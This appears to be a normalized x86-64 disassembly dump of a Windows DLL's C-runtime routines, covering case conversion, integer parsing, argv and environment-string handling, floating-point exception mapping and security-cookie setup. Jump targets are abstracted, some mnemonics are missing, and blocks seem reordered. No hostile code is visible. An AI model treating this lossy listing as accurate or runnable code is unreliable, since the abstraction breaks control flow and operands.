mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_1800085f0
cmp [ rcx ] 0x0
jne r-xdata
call sub_1800085f0
mov rcx [ rdi + 0x110 ]
call sub_1800085f0
mov rcx [ rdi + 0x128 ]
call sub_1800085f0
cmp [ rcx ] 0x0
jne r-xdata
call sub_1800085f0
mov rcx [ rdi + 0x128 ]
call sub_180010fc0
call sub_1800085f0
call sub_1800085f0
mov rcx [ rdi + 0x128 ]
call sub_180010f70
sub_18000d6d0
mov rdx rcx
[ rcx ] 0x1
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] 0x1
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] 0x1
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] 0x1
lea rax [ rcx + 0x58 ]
mov r8d 0x6
lea r9 [ rw-data ]
[ rax ] 0x1
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rcx [ rax ]
test rcx rcx
je r-xdata
add rax 0x20
sub r8 0x1
jne r-xdata
mov rcx [ rax + 0x8 ]
test rcx rcx
je r-xdata
[ rcx ] 0x1
cmp [ rax - 0x10 ] r9
je r-xdata
mov rax [ rdx + 0x158 ]
[ rax + 0x160 ] 0x1
retn
[ rcx ] 0x1
sub_18000d770
test rcx rcx
je r-xdata
mov rax rcx
retn
[ rcx ] 0xffffffff
mov rax [ rcx + 0x110 ]
test rax rax
je r-xdata
mov rax [ rcx + 0x120 ]
test rax rax
je r-xdata
[ rax ] 0xffffffff
mov rax [ rcx + 0x118 ]
test rax rax
je r-xdata
[ rax ] 0xffffffff
mov rax [ rcx + 0x130 ]
test rax rax
je r-xdata
[ rax ] 0xffffffff
lea rax [ rcx + 0x58 ]
mov r8d 0x6
lea r9 [ rw-data ]
nop
[ rax ] 0xffffffff
cmp [ rax - 0x8 ] 0x0
je r-xdata
mov rdx [ rax ]
test rdx rdx
je r-xdata
add rax 0x20
sub r8 0x1
jne r-xdata
mov rdx [ rax + 0x8 ]
test rdx rdx
je r-xdata
[ rdx ] 0xffffffff
cmp [ rax - 0x10 ] r9
je r-xdata
mov rax [ rcx + 0x158 ]
[ rax + 0x160 ] 0xffffffff
[ rdx ] 0xffffffff
sub_18000d820
push rbx
sub rsp 0x20
test rdx rdx
mov rbx rdx
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
test rcx rcx
je r-xdata
mov r10 [ rcx ]
cmp r10 rdx
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
mov [ rcx ] rdx
mov rcx rdx
call sub_18000d6d0
test r10 r10
je r-xdata
mov rcx r10
call sub_18000d770
cmp [ r10 ] 0x0
jne r-xdata
lea rax [ rw-data ]
cmp r10 rax
je r-xdata
call sub_18000d540
sub_18000d880
push rbx
sub rsp 0x20
call sub_18000a690
mov rbx rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xc
call sub_180009ab0
nop
lea rcx [ rbx + 0xc0 ]
mov rdx [ rw-data ]
call sub_18000d820
mov rbx rax
mov ecx 0xc
call sub_180009980
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
lea ecx [ rbx + 0x20 ]
call sub_180009430
call sub_18000a690
mov rbx [ rax + 0xc0 ]
jmp r-xdata
test rbx rbx
jne r-xdata
sub_18000d920
mov [ rsp + 0x8 ] cx
sub rsp 0x68
cmp cx 0xffff
jne r-xdata
test rdx rdx
mov [ rsp + 0x58 ] 0x0
jne r-xdata
or ax cx
add rsp 0x68
retn
mov rax [ rdx ]
lea r8 [ rsp + 0x40 ]
mov [ r8 ] rax
mov rax [ rdx + 0x8 ]
mov [ r8 + 0x8 ] rax
call sub_18000a690
mov r11 rax
mov [ rsp + 0x50 ] rax
mov rax [ rax + 0xc0 ]
cmp rax [ rw-data ]
mov [ rsp + 0x40 ] rax
mov rdx [ r11 + 0xb8 ]
mov [ rsp + 0x48 ] rdx
je r-xdata
cmp cx 0x100
jae r-xdata
lea eax [ rcx - 0x41 ]
cmp ax 0x19
ja r-xdata
cmp rdx [ rw-data ]
je r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
mov eax [ rax + 0x4 ]
lea r9 [ rsp + 0x70 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x1
mov [ rsp + 0x28 ] rax
mov r8d 0x100
mov [ rsp + 0x20 ] 0x1
call sub_1800115d0
test eax eax
movzx eax [ rsp + 0x70 ]
je r-xdata
lea r8 [ rsp + 0x40 ]
mov dx 0x1
call sub_180011720
test eax eax
jne r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
add cx 0x20
test [ r11 + 0xc8 ] 0x2
jne r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000d880
mov r11 [ rsp + 0x50 ]
mov rdx [ rsp + 0x48 ]
mov [ rsp + 0x40 ] rax
cmp [ rsp + 0x58 ] 0x0
je r-xdata
movzx eax [ rsp + 0x80 ]
mov rax [ rsp + 0x40 ]
movzx edx [ rsp + 0x70 ]
mov rcx [ rax + 0x148 ]
movzx eax [ rcx + rdx ]
jmp r-xdata
movzx eax [ rsp + 0x70 ]
jmp r-xdata
mov ax cx
add rsp 0x68
retn
and [ r11 + 0xc8 ] 0xfffffffd
mov cx [ rsp + 0x70 ]
jmp r-xdata
or [ r11 + 0xc8 ] 0x2
movzx ecx [ rsp + 0x70 ]
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
call sub_18000cd30
mov r11 [ rsp + 0x50 ]
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0x40 ]
add rsp 0x68
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov edx [ rax + 0x14 ]
test edx edx
jne r-xdata
mov rax [ rsp + 0x40 ]
mov r11 [ rsp + 0x50 ]
sub_18000dad0
push rbx
sub rsp 0x70
test rdx rdx
movsxd rbx ecx
mov [ rsp + 0x68 ] 0x0
jne r-xdata
mov rax [ rdx ]
lea rcx [ rsp + 0x50 ]
mov [ rcx ] rax
mov rax [ rdx + 0x8 ]
mov [ rcx + 0x8 ] rax
mov r11 [ rsp + 0x60 ]
mov rdx [ rsp + 0x50 ]
call sub_18000a690
mov [ rsp + 0x60 ] rax
mov r11 rax
mov rdx [ rax + 0xc0 ]
cmp rdx [ rw-data ]
mov [ rsp + 0x50 ] rdx
mov rax [ rax + 0xb8 ]
mov [ rsp + 0x58 ] rax
je r-xdata
cmp [ rdx + 0x10c ] 0x1
mov [ rsp + 0x90 ] rdi
jle r-xdata
cmp [ rdx + 0x10c ] 0x1
jle r-xdata
cmp rax [ rw-data ]
je r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_180008e80
mov edx 0x1
mov [ rax ] 0x2a
mov [ rsp + 0x80 ] bl
mov [ rsp + 0x81 ] 0x0
mov edi ebx
lea rdx [ rsp + 0x50 ]
sar edi 0x8
movzx ecx dil
call sub_180011890
test eax eax
je r-xdata
mov rax [ rdx + 0x140 ]
mov al [ rax + rbx * 2 ]
and eax 0x1
lea r8 [ rsp + 0x50 ]
mov edx 0x1
mov ecx ebx
call sub_180011a50
mov r11 [ rsp + 0x60 ]
mov rdx [ rsp + 0x50 ]
jmp r-xdata
test [ r11 + 0xc8 ] 0x2
jne r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000d880
mov r11 [ rsp + 0x60 ]
mov rdx rax
mov [ rsp + 0x50 ] rax
mov rax [ rsp + 0x58 ]
cmp eax 0x1
jne r-xdata
cmp [ rsp + 0x68 ] al
je r-xdata
mov [ rsp + 0x80 ] dil
mov [ rsp + 0x81 ] bl
mov [ rsp + 0x82 ] 0x0
mov edx 0x2
jmp r-xdata
cmp [ rsp + 0x68 ] 0x0
je r-xdata
cmp [ rsp + 0x68 ] 0x0
mov rax [ rdx + 0x148 ]
movzx eax [ rax + rbx ]
je r-xdata
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
or [ r11 + 0xc8 ] 0x2
mov r11 [ rsp + 0x60 ]
mov rdx [ rsp + 0x50 ]
mov [ rsp + 0x68 ] 0x1
jmp r-xdata
call sub_18000cd30
mov r11 [ rsp + 0x60 ]
mov rdx [ rsp + 0x50 ]
mov [ rsp + 0x58 ] rax
movzx eax [ rsp + 0x88 ]
movzx ecx [ rsp + 0x89 ]
shl eax 0x8
or eax ecx
cmp [ rsp + 0x68 ] 0x0
movzx eax [ rsp + 0x88 ]
cmp [ rsp + 0x68 ] 0x0
jmp r-xdata
mov eax ebx
add rsp 0x70
pop rbx
retn
mov rax [ rsp + 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rcx [ rsp + 0x50 ]
mov [ rsp + 0x40 ] 0x1
lea r9 [ rsp + 0x80 ]
mov eax [ rcx + 0x4 ]
mov r8d 0x100
mov [ rsp + 0x38 ] eax
lea rax [ rsp + 0x88 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edx
mov edx [ rcx + 0x14 ]
lea rcx [ rsp + 0x50 ]
call sub_180010870
mov rdi [ rsp + 0x90 ]
test eax eax
jne r-xdata
mov eax ebx
add rsp 0x70
pop rbx
retn
and [ r11 + 0xc8 ] 0xfffffffd
add rsp 0x70
pop rbx
retn
and [ r11 + 0xc8 ] 0xfffffffd
add rsp 0x70
pop rbx
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
je r-xdata
sub_18000dd40
mov [ rsp + 0x10 ] rdx
push r12
push r14
sub rsp 0x68
test rcx rcx
mov r12d r9d
mov r14 r8
mov [ rsp + 0x48 ] 0x0
jne r-xdata
mov rax [ rcx ]
lea r8 [ rsp + 0x30 ]
mov [ r8 ] rax
mov rax [ rcx + 0x8 ]
mov [ r8 + 0x8 ] rax
jmp r-xdata
call sub_18000a690
mov [ rsp + 0x40 ] rax
mov r11 rax
mov rcx [ rax + 0xc0 ]
cmp rcx [ rw-data ]
mov [ rsp + 0x30 ] rcx
mov rax [ rax + 0xb8 ]
mov [ rsp + 0x38 ] rax
je r-xdata
test r14 r14
je r-xdata
cmp rax [ rw-data ]
je r-xdata
mov ecx [ r11 + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
test rdx rdx
jne r-xdata
mov [ r14 ] rdx
test [ r11 + 0xc8 ] 0x2
jne r-xdata
mov eax [ r11 + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18000d880
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x38 ]
test r12d r12d
je r-xdata
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rdx [ rsp + 0x88 ]
or [ r11 + 0xc8 ] 0x2
mov rdx [ rsp + 0x88 ]
mov [ rsp + 0x48 ] 0x1
jmp r-xdata
call sub_18000cd30
mov r11 [ rsp + 0x40 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x80 ] rbx
movzx ebx [ rdx ]
mov [ rsp + 0x90 ] rbp
mov [ rsp + 0x98 ] rsi
mov [ rsp + 0x60 ] rdi
lea rdi [ rdx + 0x2 ]
lea r8 [ rsp + 0x30 ]
movzx ecx bx
mov dx 0x8
mov [ rsp + 0x58 ] r13
xor esi esi
mov [ rsp + 0x50 ] r15
call sub_180011720
test eax eax
je r-xdata
cmp r12d 0x2
jl r-xdata
xor eax eax
add rsp 0x68
pop r14
pop r12
retn
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp bx 0x2d
jne r-xdata
nop
nop
cmp r12d 0x24
jg r-xdata
cmp bx 0x2b
jne r-xdata
mov ebp [ rsp + 0xa0 ]
mov bx [ rdi ]
or ebp 0x2
add rdi 0x2
jmp r-xdata
mov bx [ rdi ]
lea r8 [ rsp + 0x30 ]
mov dx 0x8
movzx ecx bx
add rdi 0x2
call sub_180011720
test eax eax
jne r-xdata
mov ebp [ rsp + 0xa0 ]
mov bx [ rdi ]
mov ebp [ rsp + 0xa0 ]
add rdi 0x2
jmp r-xdata
test r12d r12d
jne r-xdata
cmp r12d 0x10
jne r-xdata
movzx ecx bx
call sub_180011c40
test eax eax
je r-xdata
xor edx edx
or eax 0xffffffff
div r12d
mov r15d edx
mov r13d eax
movzx ecx bx
call sub_180011c40
test eax eax
jne r-xdata
movzx eax [ rdi ]
cmp ax 0x78
je r-xdata
mov r12d 0xa
jmp r-xdata
cmp eax r12d
jae r-xdata
cmp bx 0x41
jb r-xdata
movzx eax [ rdi ]
cmp ax 0x78
je r-xdata
mov r12d 0x10
jmp r-xdata
cmp ax 0x58
je r-xdata
mov r15 [ rsp + 0x50 ]
mov r13 [ rsp + 0x58 ]
mov rbx [ rsp + 0x80 ]
sub rdi 0x2
test bpl 0x8
jne r-xdata
or ebp 0x8
cmp esi r13d
jb r-xdata
lea eax [ rbx - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp bx 0x5a
jbe r-xdata
mov bx [ rdi + 0x2 ]
add rdi 0x4
cmp ax 0x58
jne r-xdata
mov r12d 0x8
jmp r-xdata
test bpl 0x4
jne r-xdata
test r14 r14
cmovne rdi [ rsp + 0x88 ]
xor esi esi
jmp r-xdata
imul esi r12d
add esi eax
cmp esi r13d
jne r-xdata
lea eax [ rbx - 0x61 ]
cmp ax 0x19
ja r-xdata
call sub_180008e80
test bpl 0x1
mov [ rax ] 0x22
je r-xdata
test bpl 0x1
jne r-xdata
test r14 r14
je r-xdata
movzx ecx bx
call sub_180011c40
cmp eax 0xffffffff
jne r-xdata
or ebp 0x4
test r14 r14
jne r-xdata
cmp eax r15d
jbe r-xdata
movzx eax bx
movzx eax bx
sub eax 0x20
jmp r-xdata
test bpl 0x2
mov esi 0x0
setne sil
add esi 0x7fffffff
or esi 0xffffffff
jmp r-xdata
mov eax ebp
and eax 0x2
je r-xdata
mov rdi [ rsp + 0x60 ]
test bpl 0x2
mov rbp [ rsp + 0x90 ]
je r-xdata
mov [ r14 ] rdi
mov bx [ rdi ]
add rdi 0x2
jmp r-xdata
add eax 0xffffffc9
test eax eax
jne r-xdata
cmp esi 0x80000000
ja r-xdata
cmp [ rsp + 0x48 ] 0x0
je r-xdata
neg esi
cmp esi 0x7fffffff
jbe r-xdata
mov eax esi
mov rsi [ rsp + 0x98 ]
add rsp 0x68
pop r14
pop r12
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18000e0b0
sub rsp 0x38
cmp [ rw-data ] 0x0
mov r9d r8d
mov r8 rdx
mov rdx rcx
mov [ rsp + 0x20 ] 0x0
jne r-xdata
xor ecx ecx
call sub_18000dd40
add rsp 0x38
retn
lea rcx [ rw-data ]
call sub_18000dd40
add rsp 0x38
retn
sub_18000e0f0
sub rsp 0x38
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
add rsp 0x38
jmp [ HeapSize@IAT ]
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] 0x0
mov [ rax ] 0x16
call sub_180008d20
or rax 0xffffffffffffffff
add rsp 0x38
retn
sub_18000e140
push r12
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rdx [ rw-data ]
xor r12d r12d
test rdx rdx
mov r8d r12d
jne r-xdata
call sub_18000d510
movzx eax [ rdx ]
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
test al al
je r-xdata
or eax 0xffffffff
add rsp 0x30
pop r12
retn
lea eax [ r8 + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_180008870
test rax rax
mov rsi rax
mov [ rw-data ] rax
jne r-xdata
cmp al 0x3d
je r-xdata
mov [ rsp + 0x40 ] rbx
mov rbx [ rw-data ]
mov [ rsp + 0x48 ] rbp
movzx edx [ rbx ]
test dl dl
je r-xdata
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
or eax 0xffffffff
add rsp 0x30
pop r12
retn
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
add rdx rcx
mov al [ rdx ]
test al al
jne r-xdata
add r8d 0x1
mov rcx rbx
call sub_1800085f0
mov [ rw-data ] r12
mov [ rsi ] r12
mov [ rw-data ] 0x1
xor eax eax
nop
add rbx rdi
mov dl [ rbx ]
test dl dl
jne r-xdata
movsxd rbp ecx
lea edx [ rax + 0x1 ]
mov rcx rbp
call sub_180008870
test rax rax
mov [ rsi ] rax
je r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbx
[ rdi ]
cmp dl 0x3d
not rcx
movsxd rdi ecx
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_1800085f0
mov [ rw-data ] r12
or eax 0xffffffff
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_180007260
test eax eax
je r-xdata
mov rbp [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
add rsi 0x8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_180008c80
sub_18000e2b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
test rdx rdx
mov rbp [ rsp + 0x60 ]
mov r14 r9
mov [ rbp ] 0x0
mov rdi r8
mov r13 rdx
mov [ r9 ] 0x1
mov rbx rcx
je r-xdata
xor r12d r12d
nop
mov [ rdx ] r8
add r13 0x8
add [ rbp ] 0x1
test rdi rdi
je r-xdata
xor eax eax
test r12d r12d
mov sil 0x22
sete al
add rbx 0x1
mov r12d eax
jmp r-xdata
movzx esi [ rbx ]
add rbx 0x1
mov ecx esi
call sub_180011e20
test eax eax
je r-xdata
movzx eax [ rbx ]
add rdi 0x1
mov [ rdi - 0x1 ] al
test r12d r12d
jne r-xdata
test sil sil
je r-xdata
add [ rbp ] 0x1
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
sub rbx 0x1
add rbx 0x1
movzx eax [ rbx ]
add rdi 0x1
mov [ rdi - 0x1 ] al
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r13 r13
je r-xdata
nop
nop
xor esi esi
nop
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
add [ r14 ] 0x1
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov [ r13 ] 0x0
add rbx 0x1
jmp r-xdata
cmp al 0x9
jne r-xdata
movzx eax [ rbx ]
cmp al 0x20
je r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r13 r13
je r-xdata
add [ r14 ] 0x1
nop
nop
mov [ r13 ] rdi
add r13 0x8
cmp [ rbx ] 0x22
jne r-xdata
nop
test ecx ecx
je r-xdata
test dl cl
jne r-xdata
add rbx rdx
add ecx edx
cmp [ rbx ] 0x5c
je r-xdata
movzx eax [ rbx ]
test al al
je r-xdata
add ecx 0xffffffff
test rdi rdi
je r-xdata
shr ecx 0x1
test esi esi
je r-xdata
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
add [ rbp ] 0x1
test ecx ecx
jne r-xdata
mov [ rdi ] 0x5c
add rdi 0x1
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
cmp [ rbx + 0x1 ] 0x22
lea rax [ rbx + 0x1 ]
jne r-xdata
add [ rbp ] 0x1
jmp r-xdata
mov [ rdi ] 0x0
add rdi 0x1
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
add rbx 0x1
jmp r-xdata
movsx ecx al
call sub_180011e20
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
xor ecx ecx
cmp [ rbx ] 0x5c
mov edx 0x1
jne r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
add [ rbp ] 0x1
add rbx 0x1
add [ rbp ] 0x1
movzx eax [ rbx ]
add rdi 0x1
mov [ rdi - 0x1 ] al
add [ rbp ] 0x1
add rbx 0x1
jmp r-xdata
movzx eax [ rbx ]
add rdi 0x1
add rbx 0x1
mov [ rdi - 0x1 ] al
add [ rbp ] 0x1
sub_18000e4d0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_18000d510
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
or eax 0xffffffff
add rsp 0x30
pop rdi
retn
movsxd rax [ rsp + 0x48 ]
cmp rax 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000e2b0
movsxd rsi [ rsp + 0x40 ]
mov rax 0x1fffffffffffffff
cmp rsi rax
jae r-xdata
lea rcx [ rax + rsi * 8 ]
cmp rcx rax
jb r-xdata
call sub_180008800
test rax rax
mov rdi rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000e2b0
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
add r11d 0xffffffff
xor eax eax
mov [ rw-data ] r11d
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18000e5e0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x40
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
call [ GetEnvironmentStringsW@IAT ]
test rax rax
mov rdi rax
je r-xdata
cmp eax 0x2
je r-xdata
call [ GetEnvironmentStringsW@IAT ]
test rax rax
mov rdi rax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
test rax rax
mov rbx rax
je r-xdata
test eax eax
jne r-xdata
xor eax eax
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x40
pop rdi
retn
cmp [ rdi ] 0x0
mov [ rsp + 0x50 ] rbp
mov rbx rdi
mov [ rsp + 0x58 ] r12
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ rax ] 0x0
je r-xdata
xor r12d r12d
sub rbx rdi
mov r8 rdi
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
sar rbx 0x1
lea r9d [ rbx + 0x1 ]
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
test eax eax
movsxd rbp eax
je r-xdata
add rbx 0x2
cmp [ rbx ] 0x0
jne r-xdata
sub eax ebx
add eax 0x1
movsxd rsi eax
mov rcx rsi
call sub_180008800
test rax rax
mov rdi rax
jne r-xdata
nop
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
jmp r-xdata
mov rcx rbp
call sub_180008800
test rax rax
mov rsi rax
je r-xdata
add rbx 0x2
cmp [ rbx ] 0x0
jne r-xdata
mov r8 rsi
mov rdx rbx
mov rcx rax
call sub_18000aa30
mov rcx rbx
call [ FreeEnvironmentStringsA@IAT ]
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rax rdi
add rsp 0x40
pop rdi
retn
mov rcx rbx
call [ FreeEnvironmentStringsA@IAT ]
add rax 0x1
cmp [ rax ] 0x0
jne r-xdata
add rax 0x1
cmp [ rax ] 0x0
jne r-xdata
mov rbp [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x40
pop rdi
retn
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rbx + 0x1 ]
mov r8 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
mov rcx rsi
call sub_1800085f0
mov rsi r12
sub_18000e7b0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
cmp rbx rdi
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
sub_18000e7f0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
cmp rbx rdi
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
sub_18000e840
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_18000a600
test rax rax
mov rbx rax
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
xor eax eax
add rsp 0x20
pop rdi
retn
mov rcx [ rax + 0xa0 ]
movsxd r8 [ rw-data ]
mov rdx rcx
mov rax r8
shl rax 0x4
add rax rcx
cmp rdx rax
jae r-xdata
mov rax r8
add rdx 0x10
shl rax 0x4
add rax rcx
cmp rdx rax
jb r-xdata
cmp [ rdx ] edi
jne r-xdata
cmp [ rdx ] edi
je r-xdata
mov r9 [ rdx + 0x8 ]
test r9 r9
je r-xdata
cmp r9 0x5
jne r-xdata
cmp r9 0x1
jne r-xdata
xor r8d r8d
lea eax [ r9 - 0x4 ]
mov [ rdx + 0x8 ] r8
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rbp
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
mov ecx [ rdx + 0x4 ]
cmp ecx 0x8
jne r-xdata
or eax 0xffffffff
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
xor r8d r8d
mov [ rdx + 0x8 ] r8
call r9
mov [ rbx + 0xa8 ] rbp
mov rbp [ rsp + 0x30 ]
or eax 0xffffffff
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
movsxd r10 [ rw-data ]
mov ecx [ rw-data ]
add ecx r10d
mov r11 r10
cmp r10d ecx
jge r-xdata
mov eax [ rdx ]
mov edi [ rbx + 0xb0 ]
cmp eax 0xc000008e
jne r-xdata
shl r11 0x4
xor r8d r8d
nop
cmp eax 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
mov rax [ rbx + 0xa0 ]
add r10d 0x1
add r11 0x10
mov [ r11 + rax - 0x8 ] r8
mov ecx [ rw-data ]
mov eax [ rw-data ]
add ecx eax
cmp r10d ecx
jl r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r9
mov [ rbx + 0xa8 ] rbp
mov rbp [ rsp + 0x30 ]
mov [ rbx + 0xb0 ] edi
or eax 0xffffffff
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
cmp eax 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
cmp eax 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
mov [ rbx + 0xb0 ] 0x8a
sub_18000ea60
push rdi
sub rsp 0x20
mov rax [ rw-data ]
mov rdi 0x2b992ddfa232
mov [ rsp + 0x30 ] 0x0
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x40 ] rbx
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
